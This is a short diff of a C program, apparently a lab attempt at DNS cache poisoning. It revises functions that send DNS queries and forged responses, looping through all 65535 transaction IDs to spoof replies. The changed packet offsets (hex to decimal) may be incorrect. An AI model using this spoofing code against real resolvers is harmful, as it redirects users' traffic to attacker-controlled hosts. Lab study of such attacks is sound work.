@@ -89,24 +89,24 @@ int main()
 /* Use for sending DNS request.
  * Add arguments to the function definition if needed.
  * */
-void send_dns_request()				//ATTEMPT #1
+void send_dns_request()				//ATTEMPT #2
 {
-	memcpy(ip_req + 0x29, name, 5);
-	sendto(sock, ip_req, n_req, 0, (struct sockaddr *)&req_dest_info, sizeof(req_dest_info));
+	memcpy(ip_req+29, name, 5);
+	sendto(sock, ip_req, n_req, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
 }
 
 
 /* Use for sending forged DNS response.
  * Add arguments to the function definition if needed.
  * */
-void send_dns_response()		        //ATTEMPT #1
+void send_dns_response()		        //ATTEMPT #2
 {
-	memcpy(ip_resp + 0x29, name, 5);
-	memcpy(ip_resp + 0x40, name, 5);
+	memcpy(ip_resp+29, name, 5);
+	memcpy(ip_resp+40, name, 5);
 	for(int i=0; i<65535; i++)
 		{unsigned short id = htons(i);
 		 memcpy(ip_resp + 28, &id, 2);
-		 sendto(sock, ip_resp, n_resp, 0, (struct sockaddr *)&resp_dest_info, sizeof(resp_dest_info));}	 
+		 sendto(sock, ip_resp, n_resp, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));}	 
 }
 
 
